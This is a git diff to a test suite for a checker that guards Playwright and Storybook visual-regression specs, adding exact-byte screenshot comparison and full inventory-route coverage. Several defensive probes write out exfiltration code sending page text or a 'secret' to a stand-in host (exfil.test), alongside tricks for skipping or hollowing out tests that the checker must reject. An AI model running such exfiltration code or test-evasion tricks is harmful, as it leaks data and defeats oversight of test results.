@@ -14,6 +14,8 @@ import {
 after(cleanUpScratchRepos);
 
 const INVENTORY = [
+  "| Screen | Route | Kind | Stage | Status |",
+  "| --- | --- | --- | --- | --- |",
   "| Work list | `/agent/projects/{key}/work?layout=list` | route | P1 | 🟡 |",
   "| Work item detail | `/agent/work-items/{key}` | route | P1 | ✅ |",
   "| Future inbox | `/agent/inbox` | route | P1 | ⬜ |",
@@ -34,7 +36,20 @@ const SCREENS = [
     test: "work item detail @visual",
     screenshot: "work-item-detail.png",
   },
+  {
+    name: "future-inbox",
+    inventoryRoute: "/agent/inbox",
+    applicationRoute: "/agent/inbox",
+    test: "future inbox @visual",
+    screenshot: "future-inbox.png",
+  },
 ];
+
+const EXACT_SCREENSHOT_HELPER = `async function assertExactScreenshotBytes(page: Page, testInfo: TestInfo, name: string) {
+  const actual = await page.screenshot({ animations: "disabled", caret: "hide", fullPage: true, scale: "css" });
+  const expected = await readFile(testInfo.snapshotPath(name, { kind: "screenshot" }));
+  expect(actual.equals(expected)).toBe(true);
+}`;
 
 function visualSpec(
   screens,
@@ -96,8 +111,12 @@ function visualSpec(
                 : testName === mutateScreenshotOptionsFor
                   ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, SCREENSHOT_OPTIONS);`
                   : testName === excessiveInlineThresholdFor
-                    ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 100000000 });`
-                    : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0 });`;
+                    ? `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });`
+                    : `await expect(page).toHaveScreenshot(${JSON.stringify(screenshot)}, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });`;
+      const exactScreenshotEvidence =
+        testName === omitScreenshotFor
+          ? ""
+          : `await assertExactScreenshotBytes(page, testInfo, ${JSON.stringify(screenshot)});`;
       const additionalNavigation =
         testName === additionalNavigationFor ? "await page.goto(target);" : "";
       const additionalVisualOperation =
@@ -155,11 +174,13 @@ function visualSpec(
           : "";
       const beforeNavigation =
         testName === screenshotBeforeNavigationFor
-          ? `${screenshotEvidence} `
+          ? `${screenshotEvidence} ${exactScreenshotEvidence} `
           : "";
       const afterNavigation =
-        testName === screenshotBeforeNavigationFor ? "" : screenshotEvidence;
-      return `test(${JSON.stringify(testName)}, async ({ page, page: aliasedPage }) => { ${
+        testName === screenshotBeforeNavigationFor
+          ? ""
+          : `${screenshotEvidence} ${exactScreenshotEvidence}`;
+      return `test(${JSON.stringify(testName)}, async ({ page, page: aliasedPage }, testInfo) => { ${
         testName === disabledFor
           ? 'if (process.env.CI) test.fixme(true, "known issue");'
           : ""
@@ -167,14 +188,14 @@ function visualSpec(
     })
     .join("\n");
   const testImport = fakeTestBinding
-    ? 'import { expect, test as playwrightTest } from "@playwright/test";\nconst test = (_title, _callback) => {};'
-    : 'import { expect, test } from "@playwright/test";';
+    ? 'import { expect, test as playwrightTest, type Page, type TestInfo } from "@playwright/test";\nconst test = (_title, _callback) => {};'
+    : 'import { expect, test, type Page, type TestInfo } from "@playwright/test";';
   const screenshotOptions = screens.some(
     ({ test: testName }) => testName === mutateScreenshotOptionsFor,
   )
-    ? "const SCREENSHOT_OPTIONS = { fullPage: true, maxDiffPixels: 0 };\nSCREENSHOT_OPTIONS.maxDiffPixels = 100000000;"
+    ? "const SCREENSHOT_OPTIONS = { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true };\nSCREENSHOT_OPTIONS.maxDiffPixels = 100000000;"
     : "";
-  return `${testImport}\n${runtimeCode}\n${screenshotOptions}\n${helper}\n${tests}`;
+  return `import { readFile } from "node:fs/promises";\n${testImport}\n${runtimeCode}\n${EXACT_SCREENSHOT_HELPER}\n${screenshotOptions}\n${helper}\n${tests}`;
 }
 
 function storybookSpec({
@@ -320,28 +341,30 @@ function storybookSpec({
           ...(additionalLocatorEvaluation ? [additionalLocatorEvaluation] : []),
           ...(skipStoryCaptureInCi ? ["  if (process.env.CI) continue;"] : []),
           excessiveInlineThreshold
-            ? "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 100000000 });"
-            : "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 0 });",
+            ? "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 100000000, threshold: 0, includeAA: true });"
+            : "  await expect(page).toHaveScreenshot(`\u0024{story.id}.png`, { fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true });",
+          "  await assertExactScreenshotBytes(page, testInfo, `\u0024{story.id}.png`);",
           "}",
         ]),
   ].join("\n");
-  const testCase = `test("every exported Storybook story has a visual baseline @visual", async ({ page }) => {\n${body}\n});`;
+  const testCase = `test("every exported Storybook story has a visual baseline @visual", async ({ page }, testInfo) => {\n${body}\n});`;
   const testImport = fakeTestBinding
-    ? 'import { expect, test as playwrightTest } from "@playwright/test";\nconst test = (_title, _callback) => {};'
-    : 'import { expect, test } from "@playwright/test";';
+    ? 'import { expect, test as playwrightTest, type Page, type TestInfo } from "@playwright/test";\nconst test = (_title, _callback) => {};'
+    : 'import { expect, test, type Page, type TestInfo } from "@playwright/test";';
+  const prelude = `import { readFile } from "node:fs/promises";\n${testImport}\n${EXACT_SCREENSHOT_HELPER}`;
   const outerAlias = mutateObjectValuesByOuterAlias
     ? "\nconst objectNamespace = Object;"
     : "";
   if (describeSkip) {
-    return `${testImport}${outerAlias}\ntest.describe.skip("visual Storybook coverage", () => {\n${testCase}\n});`;
+    return `${prelude}${outerAlias}\ntest.describe.skip("visual Storybook coverage", () => {\n${testCase}\n});`;
   }
   if (describeConfigureSkip) {
-    return `${testImport}${outerAlias}\ntest.describe.configure({ mode: "skip" });\n${testCase}`;
+    return `${prelude}${outerAlias}\ntest.describe.configure({ mode: "skip" });\n${testCase}`;
   }
   if (describeConfigureDynamic) {
-    return `${testImport}${outerAlias}\ntest.describe.configure({ mode: process.env.CI ? "skip" : "default" });\n${testCase}`;
+    return `${prelude}${outerAlias}\ntest.describe.configure({ mode: process.env.CI ? "skip" : "default" });\n${testCase}`;
   }
-  return `${testImport}${outerAlias}\n${runtimeCode}\n${testCase}`;
+  return `${prelude}${outerAlias}\n${runtimeCode}\n${testCase}`;
 }
 
 function routeTree(routes) {
@@ -351,6 +374,7 @@ function routeTree(routes) {
 async function runVisualScope({
   screens = SCREENS,
   routes = [],
+  inventory = INVENTORY,
   source = visualSpec(screens),
   storySource = storybookSpec(),
 } = {}) {
@@ -363,7 +387,7 @@ async function runVisualScope({
     "dir",
   );
 
-  write(dir, "docs/02-design/screen-inventory.md", INVENTORY);
+  write(dir, "docs/02-design/screen-inventory.md", inventory);
   write(dir, "apps/web/src/routeTree.gen.ts", routeTree(routes));
   write(dir, "apps/web/e2e/visual-screens.json", JSON.stringify(screens));
   write(
@@ -388,27 +412,150 @@ async function runVisualScope({
   return runChecker(dir, "check-visual-scope.mjs");
 }
 
-const ACTIVE_ROUTES = [
+const INVENTORY_ROUTES = [
   "/agent/projects/$projectKey/work",
   "/agent/work-items/$key",
+  "/agent/inbox",
 ];
 
-test("G8 accepts active inventory routes and leaves not-started routes pending", async () => {
-  const result = await runVisualScope({ routes: ACTIVE_ROUTES });
+test("G8 requires baselines for active and not-started inventory routes", async () => {
+  const result = await runVisualScope({ routes: INVENTORY_ROUTES });
 
   assert.equal(result.status, 0, result.output);
   assert.match(
     result.output,
-    /2 screenshot cases, 2 active inventory route rows mapped \(2 in-progress or complete among 3 route rows\)/,
+    /3 screenshot cases, all 3 inventory route rows mapped \(2 in-progress or complete\)/,
   );
 });
 
+test("G8 rejects a padded active inventory row without a matching baseline", async () => {
+  const inventory = `${INVENTORY}\n| Hidden active row |  \`/agent/notifications\`  | route | P1 | 🟡 |`;
+  const result = await runVisualScope({
+    routes: [...INVENTORY_ROUTES, "/agent/notifications"],
+    inventory,
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(
+    result.output,
+    /inventory route Hidden active row \(\/agent\/notifications\) has no G8 test\/baseline manifest entry/,
+  );
+});
+
+test("G8 rejects malformed inventory rows rather than dropping them", async () => {
+  const inventory = `${INVENTORY}\n| Hidden active row | \`/agent/inbox\` | route | P1 | 🟡`;
+  const result = await runVisualScope({
+    routes: INVENTORY_ROUTES,
+    inventory,
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /screen inventory line .* malformed table row/);
+});
+
+test("G8 rejects an active inventory row missing its opening pipe", async () => {
+  const inventory = `${INVENTORY}\nHidden active row | \`/agent/inbox\` | route | P1 | 🟡 |`;
+  const result = await runVisualScope({
+    routes: [...INVENTORY_ROUTES, "/agent/notifications"],
+    inventory,
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /screen inventory line .* malformed table row/);
+});
+
+for (const [label, mutation] of [
+  ["missing threshold", (source) => source.replace("threshold: 0, ", "")],
+  [
+    "nonzero threshold",
+    (source) => source.replace("threshold: 0", "threshold: 0.01"),
+  ],
+  ["missing includeAA", (source) => source.replace("includeAA: true", "")],
+  [
+    "false includeAA",
+    (source) => source.replace("includeAA: true", "includeAA: false"),
+  ],
+  [
+    "comparator override",
+    (source) =>
+      source.replace(
+        "{ fullPage: true, ",
+        '{ comparator: "ssim-cie94", fullPage: true, ',
+      ),
+  ],
+  [
+    "pixel ratio tolerance",
+    (source) =>
+      source.replace(
+        "{ fullPage: true, ",
+        "{ maxDiffPixelRatio: 1, fullPage: true, ",
+      ),
+  ],
+]) {
+  test(`G8 rejects Storybook screenshot comparison option ${label}`, async () => {
+    const result = await runVisualScope({
+      routes: INVENTORY_ROUTES,
+      storySource: mutation(storybookSpec()),
+    });
+
+    assert.notEqual(result.status, 0);
+    assert.match(
+      result.output,
+      /Storybook visual test must load the exported-story index/,
+    );
+  });
+
+  test(`G8 rejects route screenshot comparison option ${label}`, async () => {
+    const result = await runVisualScope({
+      routes: INVENTORY_ROUTES,
+      source: mutation(visualSpec(SCREENS)),
+    });
+
+    assert.notEqual(result.status, 0);
+    assert.match(
+      result.output,
+      /does not capture its declared screenshot baseline/,
+    );
+  });
+}
+
 test("G8 permits the canonical navigation, Storybook fetch, and read-only callbacks", async () => {
-  const result = await runVisualScope({ routes: ACTIVE_ROUTES });
+  const result = await runVisualScope({ routes: INVENTORY_ROUTES });
 
   assert.equal(result.status, 0, result.output);
   assert.match(result.output, /G8 scope check passed/);
 });
+
+test("G8 exact screenshot byte equality rejects an antialias-only pixel change", () => {
+  const baseline = Buffer.from(
+    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGM4ceLEfwAIDANYH/+28wAAAABJRU5ErkJggg==",
+    "base64",
+  );
+  const antialiasChanged = Buffer.from(
+    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGM4eeLEfwAIEANZxhx+aQAAAABJRU5ErkJggg==",
+    "base64",
+  );
+
+  assert.equal(antialiasChanged.equals(baseline), false);
+});
+
+for (const surface of ["route", "Storybook"]) {
+  test(`G8 ${surface} screenshot comparator rejects partial-byte equality`, async () => {
+    const weakenComparator = (source) =>
+      source.replace(
+        "actual.equals(expected)",
+        "actual.subarray(0, 1).equals(expected.subarray(0, 1))",
+      );
+    const result = await runVisualScope({
+      routes: INVENTORY_ROUTES,
+      ...(surface === "route"
+        ? { source: weakenComparator(visualSpec(SCREENS)) }
+        : { storySource: weakenComparator(storybookSpec()) }),
+    });
+
+    assert.notEqual(result.status, 0);
+  });
+}
 
 test("G8 rejects opaque browser execution and string-based code executors", async () => {
   const probes = [
@@ -422,7 +569,7 @@ test("G8 rejects opaque browser execution and string-based code executors", asyn
 
   for (const runtimeCode of probes) {
     const result = await runVisualScope({
-      routes: ACTIVE_ROUTES,
+      routes: INVENTORY_ROUTES,
       source: visualSpec(SCREENS, { runtimeCode }),
     });
 
@@ -433,7 +580,7 @@ test("G8 rejects opaque browser execution and string-based code executors", asyn
 
 test("G8 rejects evaluateHandle through an allowed page locator alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalVisualOperationFor: "work list @visual",
     }),
@@ -445,7 +592,7 @@ test("G8 rejects evaluateHandle through an allowed page locator alias", async ()
 
 test("G8 rejects evaluateAll through an allowed page locator alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalVisualOperationFor: "work list @visual",
       additionalVisualOperationCode:
@@ -459,7 +606,7 @@ test("G8 rejects evaluateAll through an allowed page locator alias", async () =>
 
 test("G8 rejects an extracted evaluateHandle method alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalVisualOperationFor: "work list @visual",
       additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const run = root.evaluateHandle; await run(source);`,
@@ -472,7 +619,7 @@ test("G8 rejects an extracted evaluateHandle method alias", async () => {
 
 test("G8 rejects a destructured evaluateHandle method alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalVisualOperationFor: "work list @visual",
       additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const { evaluateHandle: run } = root; await run(source);`,
@@ -485,7 +632,7 @@ test("G8 rejects a destructured evaluateHandle method alias", async () => {
 
 test("G8 rejects computed evaluateHandle access on a locator alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalVisualOperationFor: "work list @visual",
       additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; await root["evaluateHandle"](source);`,
@@ -498,7 +645,7 @@ test("G8 rejects computed evaluateHandle access on a locator alias", async () =>
 
 test("G8 rejects string source passed to the approved Storybook page evaluation", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       pageEvaluateCallback:
         "\"fetch(\\'https://exfil.test/?x=\\'+document.documentElement.innerText)\" as any",
@@ -511,7 +658,7 @@ test("G8 rejects string source passed to the approved Storybook page evaluation"
 
 test("G8 rejects arbitrary fetch calls and request options in visual specs", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       runtimeCode:
         'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
@@ -524,7 +671,7 @@ test("G8 rejects arbitrary fetch calls and request options in visual specs", asy
 
 test("G8 allows only the single canonical Storybook index fetch", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       runtimeCode:
         'void fetch("https://exfil.test/collect", { method: "POST", body: "secret" });',
@@ -550,7 +697,7 @@ test("G8 rejects alternate network APIs in required visual specs", async () => {
 
   for (const runtimeCode of probes) {
     const result = await runVisualScope({
-      routes: ACTIVE_ROUTES,
+      routes: INVENTORY_ROUTES,
       source: visualSpec(SCREENS, { runtimeCode }),
     });
 
@@ -561,7 +708,7 @@ test("G8 rejects alternate network APIs in required visual specs", async () => {
 
 test("G8 rejects Storybook runtime mutation of array iteration or dynamic code execution", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       runtimeCode: [
         "Array.prototype[Symbol.iterator] = function* () {};",
@@ -572,12 +719,12 @@ test("G8 rejects Storybook runtime mutation of array iteration or dynamic code e
   });
 
   assert.notEqual(result.status, 0);
-  assert.match(result.output, /contains imports or runtime constructs/);
+  assert.match(result.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects aliased Playwright controls and callback defaults", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       runtimeCode: [
         "const skipVisual = test.skip;",
@@ -588,12 +735,12 @@ test("G8 rejects aliased Playwright controls and callback defaults", async () =>
   });
 
   assert.notEqual(result.status, 0);
-  assert.match(result.output, /contains imports or runtime constructs/);
+  assert.match(result.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects assignment aliases and computed Playwright control calls", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       runtimeCode: "let testApi; testApi = test;",
       computedAliasSkip: true,
@@ -601,12 +748,12 @@ test("G8 rejects assignment aliases and computed Playwright control calls", asyn
   });
 
   assert.notEqual(result.status, 0);
-  assert.match(result.output, /contains imports or runtime constructs/);
+  assert.match(result.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects Playwright references passed through mutation and computed APIs", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       runtimeCode: [
         'Object.defineProperty(Object, "t", { value: test });',
@@ -616,40 +763,40 @@ test("G8 rejects Playwright references passed through mutation and computed APIs
   });
 
   assert.notEqual(result.status, 0);
-  assert.match(result.output, /contains imports or runtime constructs/);
+  assert.match(result.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects suite configuration and process exit before screenshots run", async () => {
   const configured = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({
       runtimeCode: "test.describe.configure({ mode: 'default' });",
     }),
   });
   assert.notEqual(configured.status, 0);
-  assert.match(configured.output, /contains imports or runtime constructs/);
+  assert.match(configured.output, /contains unsafe runtime code/);
 
   const exited = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ runtimeCode: "process.exit(0);" }),
   });
   assert.notEqual(exited.status, 0);
-  assert.match(exited.output, /contains imports or runtime constructs/);
+  assert.match(exited.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects untrusted loaders in screenshot specifications", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: `${visualSpec(SCREENS)}\nimport { readFileSync } from "node:fs";`,
   });
 
   assert.notEqual(result.status, 0);
-  assert.match(result.output, /contains imports or runtime constructs/);
+  assert.match(result.output, /contains unsafe runtime code/);
 });
 
 test("G8 rejects a no-op wrapper that shadows Playwright's test import", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { fakeTestBinding: true }),
   });
 
@@ -662,7 +809,7 @@ test("G8 rejects a no-op wrapper that shadows Playwright's test import", async (
 
 test("G8 rejects a computed test.skip call in a route visual test", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { computedSkipFor: "work list @visual" }),
   });
 
@@ -675,7 +822,7 @@ test("G8 rejects a computed test.skip call in a route visual test", async () => 
 
 test("G8 rejects a visual callback that shadows its Playwright page fixture", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       shadowedPageBindingFor: "work list @visual",
     }),
@@ -688,16 +835,16 @@ test("G8 rejects a visual callback that shadows its Playwright page fixture", as
   );
 });
 
-test("G8 fails when an active inventory route has no manifest baseline", async () => {
+test("G8 fails when a not-started inventory route has no manifest baseline", async () => {
   const result = await runVisualScope({
-    screens: SCREENS.slice(0, 1),
-    routes: ACTIVE_ROUTES,
+    screens: SCREENS.slice(0, 2),
+    routes: INVENTORY_ROUTES,
   });
 
   assert.notEqual(result.status, 0);
   assert.match(
     result.output,
-    /in-progress or complete inventory route Work item detail .* has no G8 test\/baseline manifest entry/,
+    /inventory route Future inbox .* has no G8 test\/baseline manifest entry/,
   );
 });
 
@@ -709,7 +856,7 @@ test("G8 binds each declared screenshot to its own named test", async () => {
   assert.match(source, /toHaveScreenshot\("work-item-detail\.png"/);
 
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source,
   });
 
@@ -722,7 +869,7 @@ test("G8 binds each declared screenshot to its own named test", async () => {
 
 test("G8 rejects a visual test that navigates to another application route", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { wrongRouteFor: "work list @visual" }),
   });
 
@@ -735,7 +882,7 @@ test("G8 rejects a visual test that navigates to another application route", asy
 
 test("G8 binds each visual test to its declared application route and query state", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { wrongQueryFor: "work list @visual" }),
   });
 
@@ -748,7 +895,7 @@ test("G8 binds each visual test to its declared application route and query stat
 
 test("G8 rejects an additional nonliteral route navigation", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       additionalNavigationFor: "work list @visual",
     }),
@@ -763,7 +910,7 @@ test("G8 rejects an additional nonliteral route navigation", async () => {
 
 test("G8 rejects a nested conditional route navigation", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       nestedNavigationFor: "work list @visual",
     }),
@@ -783,7 +930,7 @@ test("G8 rejects route navigation hidden in an external helper", async () => {
       helperNavigationFor: "work list @visual",
     },
   )}`;
-  const result = await runVisualScope({ routes: ACTIVE_ROUTES, source });
+  const result = await runVisualScope({ routes: INVENTORY_ROUTES, source });
 
   assert.notEqual(result.status, 0);
   assert.match(
@@ -794,7 +941,7 @@ test("G8 rejects route navigation hidden in an external helper", async () => {
 
 test("G8 requires the screenshot capture to follow its declared route navigation", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       screenshotBeforeNavigationFor: "work list @visual",
     }),
@@ -809,7 +956,7 @@ test("G8 requires the screenshot capture to follow its declared route navigation
 
 test("G8 rejects an early return that makes the screenshot unreachable", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { earlyReturnFor: "work list @visual" }),
   });
 
@@ -822,7 +969,7 @@ test("G8 rejects an early return that makes the screenshot unreachable", async (
 
 test("G8 rejects replacing the declared route document before capture", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       setContentAfterNavigationFor: "work list @visual",
     }),
@@ -837,7 +984,7 @@ test("G8 rejects replacing the declared route document before capture", async ()
 
 test("G8 rejects a shadowed visual helper that can replace the page document", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       shadowedSettleHelperFor: "work list @visual",
     }),
@@ -852,7 +999,7 @@ test("G8 rejects a shadowed visual helper that can replace the page document", a
 
 test("G8 rejects page document replacement hidden in a visible assertion argument", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       mutationInVisibilityFor: "work list @visual",
     }),
@@ -867,7 +1014,7 @@ test("G8 rejects page document replacement hidden in a visible assertion argumen
 
 test("G8 requires screen visual baselines to capture the whole page", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { locatorScreenshotFor: "work list @visual" }),
   });
 
@@ -880,7 +1027,7 @@ test("G8 requires screen visual baselines to capture the whole page", async () =
 
 test("G8 rejects viewport-only screenshots as the route baseline", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { viewportScreenshotFor: "work list @visual" }),
   });
 
@@ -893,7 +1040,7 @@ test("G8 rejects viewport-only screenshots as the route baseline", async () => {
 
 test("G8 rejects a shadowed pre-navigation fixture helper", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       shadowedFixtureHelperFor: "work list @visual",
     }),
@@ -908,7 +1055,7 @@ test("G8 rejects a shadowed pre-navigation fixture helper", async () => {
 
 test("G8 rejects route interception that can replace the application document", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       documentInterceptFor: "work list @visual",
     }),
@@ -923,7 +1070,7 @@ test("G8 rejects route interception that can replace the application document", 
 
 test("G8 rejects DOM mutation inside an API fixture route handler", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       setContentInApiRouteFor: "work list @visual",
     }),
@@ -938,7 +1085,7 @@ test("G8 rejects DOM mutation inside an API fixture route handler", async () => 
 
 test("G8 rejects computed tagged-template mutation through an aliased page fixture", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       computedTaggedSetContentInApiRouteFor: "work list @visual",
     }),
@@ -953,7 +1100,7 @@ test("G8 rejects computed tagged-template mutation through an aliased page fixtu
 
 test("G8 does not accept a nested screenshot helper as a route assertion", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       nestedScreenshotFor: "work list @visual",
     }),
@@ -968,7 +1115,7 @@ test("G8 does not accept a nested screenshot helper as a route assertion", async
 
 test("G8 rejects a visual route test that conditionally calls test.fixme", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, { disabledFor: "work list @visual" }),
   });
 
@@ -981,7 +1128,7 @@ test("G8 rejects a visual route test that conditionally calls test.fixme", async
 
 test("G8 fails when the Storybook test title remains but its coverage loop is removed", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ emptyCallback: true }),
   });
 
@@ -994,7 +1141,7 @@ test("G8 fails when the Storybook test title remains but its coverage loop is re
 
 test("G8 rejects a Storybook callback that conditionally calls test.skip", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ conditionalSkip: true }),
   });
 
@@ -1007,7 +1154,7 @@ test("G8 rejects a Storybook callback that conditionally calls test.skip", async
 
 test("G8 rejects a Storybook loop that continues before its screenshot in CI", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ skipStoryCaptureInCi: true }),
   });
 
@@ -1020,7 +1167,7 @@ test("G8 rejects a Storybook loop that continues before its screenshot in CI", a
 
 test("G8 rejects a Storybook story list mutation after its nonempty assertion", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateStoriesAfterAssertion: true }),
   });
 
@@ -1033,7 +1180,7 @@ test("G8 rejects a Storybook story list mutation after its nonempty assertion", 
 
 test("G8 rejects a Storybook list that freezes the array but leaves entries mutable", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ freezeStoryEntries: false }),
   });
 
@@ -1046,7 +1193,7 @@ test("G8 rejects a Storybook list that freezes the array but leaves entries muta
 
 test("G8 rejects deletion from the fetched index before story enumeration", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ deleteIndexEntriesBeforeFreeze: true }),
   });
 
@@ -1059,7 +1206,7 @@ test("G8 rejects deletion from the fetched index before story enumeration", asyn
 
 test("G8 rejects edits to fetched story entries before story enumeration", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ rewriteIndexEntryBeforeFreeze: true }),
   });
 
@@ -1072,7 +1219,7 @@ test("G8 rejects edits to fetched story entries before story enumeration", async
 
 test("G8 rejects overwriting Object.values before story enumeration", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateObjectValues: true }),
   });
 
@@ -1085,7 +1232,7 @@ test("G8 rejects overwriting Object.values before story enumeration", async () =
 
 test("G8 rejects overwriting Object.values through a local alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateObjectValuesByAlias: true }),
   });
 
@@ -1098,7 +1245,7 @@ test("G8 rejects overwriting Object.values through a local alias", async () => {
 
 test("G8 rejects overwriting Object.values through an outer alias", async () => {
   const result = await runVisualScope({
